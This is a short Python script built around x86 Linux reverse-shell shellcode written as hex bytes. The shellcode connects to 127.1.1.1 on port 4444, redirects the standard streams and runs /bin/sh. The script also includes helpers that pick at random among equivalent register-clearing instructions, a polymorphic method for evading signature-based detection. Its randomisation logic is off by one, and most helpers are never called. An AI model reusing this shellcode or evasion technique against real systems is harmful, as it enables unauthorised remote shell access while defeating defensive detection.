import random
from _socket import htons


def main():
    #print(htons(127))
    #shellcode = "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    shellcode = "\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    print("Shellcode bytes size: %d" % (len(shellcode)))
    random_eax_clear()
    print(shellcode.encode('utf-8'))

def random_eax_clear():
    rax_clear_array = ["\x31\xc0", "\xC1\xE8\x1F", "\xC1\xE0\x1F\x0F\xC8\x2C\x80", "\x29\xC0", "\xB8\x01\x83\xE8\x01", "\xB8\xFF\xFF\xFF\xFF\x83\xC0\x01"]
    random_element = random.randrange(0, len(rax_clear_array))-1
    #random_element = 4
    #if random_element == 4:
    #    print('\\x', end="")
    #    random_byte_value = format(random.getrandbits(8), 'x')
    #    print(random_byte_value.encode('utf-8'))
        #return rax_clear_array[random_element] % (random_byte_value, random_byte_value)
    #else:
        #return rax_clear_array[random_element]
    #    print(rax_clear_array[random_element])
    print(rax_clear_array[random_element].encode('utf-8'), end="")


def random_ebx_clear():
    ebx_clear_array = ["\x31\xDB", "\xC1\xEB\x1F", "\xC1\xE3\x1F\x0F\xCB\x80\xEB\x80", "\x29\xDB", "\xBB\x01\x83\xEB\x01", "\xBB\xFF\xFF\xFF\xFF\x83\xC3\x01"]
    random_element = random.randrange(0, len(ebx_clear_array))-1

    print(ebx_clear_array[random_element].encode('utf-8'), end="")

def random_ecx_clear():
    ecx_clear_array = ["\x31\xC9", "\xC1\xE9\x1F", "\xC1\xE1\x1F\x0F\xC9\x80\xE9\x80", "\x29\xC9", "\xB9\x01\x83\xE9\x01", "\xB9\xFF\xFF\xFF\xFF\x83\xC1\x01"]
    random_element = random.randrange(0, len(ecx_clear_array))-1

    print(ecx_clear_array[random_element].encode('utf-8'), end="")

def random_edx_clear():
    edx_clear_array = ["\x31\xD2", "\xC1\xEA\x1F", "\xC1\xE2\x1F\x0F\xCA\x80\xEA\x80", "\x29\xD2", "\xBA\x01\x83\xEA\x01", "\xBA\xFF\xFF\xFF\xFF\x83\xC2\x01"]
    random_element = random.randrange(0, len(edx_clear_array))-1

    print(edx_clear_array[random_element].encode('utf-8'), end="")



if __name__ == '__main__':
    main()
